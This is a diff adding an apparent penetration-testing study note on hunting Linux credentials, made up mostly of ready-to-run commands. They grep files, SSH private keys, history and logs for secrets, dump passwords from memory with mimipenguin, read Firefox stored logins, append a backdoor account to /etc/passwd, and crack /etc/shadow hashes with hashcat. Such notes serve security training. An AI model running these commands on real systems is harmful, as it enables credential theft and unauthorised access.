@@ -1,0 +1,61 @@
+---
+title: linux credential hunting
+---
+
+# linux credential hunting
+
+- sources
+    - files - configs, databases, notes, scripts, source code, cronjobs, sshkeys
+        - configs `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done`
+            - contains user|pass|password`for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done`
+        - databases `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done`
+        - notes `find /home/* -type f -name "*.txt" -o ! -name "*.*"`
+        - scripts `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done`
+        - cronjobs 
+            - `cat /etc/crontab`
+            - `ls -la /etc/cron.*/`
+        - sshkeys
+            - private keys `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"`
+            - public keys `grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"`
+    - history - logs, command line history
+        - bash history
+            - `tail -n5 /home/*/.bash*`
+        - logs
+            - `for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done`
+    - memory - cache, in memory processing
+        - [mimipenguin](https://github.com/huntergregal/mimipenguin)
+            - `sudo python3 /usr/share/powershell-empire/empire/server/data/module_source/python/collection/mimipenguin.py`
+    - key rings - browser stored credentials
+        - `ls -l .mozilla/firefox/ | grep default`
+        - `cat ~/.mozilla/firefox/nw9dsp6v.default-esr/logins.json`
+        - [firefox decrypt](../tools/firefoxdecrypt.md) can decrypt the strings but use [laZagne](kb/htb/redteam/assets/tools/laZagne.md) instead cause its easier
+            - `python3.9 firefox_decrypt.py` 
+- /etc/passwd
+    - contains information about users
+    - format `loginname:password:UID:GUID:fullnameorcomments:homedirectory:shell`
+        - Password 
+            - `empty` no password `su`
+            - `114149632e3687b9d018e37d60600dc1` password hash
+            - `x` password stored in /etc/shadow
+    - [ ] can we write to this file?
+        - username:bobbytables password:Monkey123!
+        - `echo "btables:$6$randomsalt$sqvdcmMw9y6rds04.xIrd6eRmluX4RYgi/zDIiVft.nndvcGAewGFHNocMSRERL7bXYPp9QoLcE65qgqs.vrK/:1001:1001:New User,,,:/home/btables:/bin/bash" | sudo tee -a /etc/passwd`
+    - 
+
+- /etc/shadow
+    - contains passwords, must contain username entry in /etc/passwd
+    - format `username:password:Last PW change:Min. PW age:Max. PW age:Warning period:Inactivity period:Expiration date:Unused`
+    - if password = ! or * then the user cannot log in with a password (key based auth may still work)
+- /etc/security/opasswd
+    - PAM library pam_unix.so can prevent reusing passwords
+    - these passwords are hashed with md5 so are easier to crack
+    - [ ] can we read this file?
+- cracking linux creds
+    - unshadow
+        - copy /etc/passwd and /etc/shadow
+            - `sudo cp /etc/passwd /tmp/passwd.bak; sudo cp /etc/shadow /tmp/shadow.bak`
+        - `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes`
+        - crack
+            - `hashcat -m 1800 -a 0 ~/test/unshadowed.hashes rockyou.txt -o ~/test/unshadowed.cracked`
+        - 
+
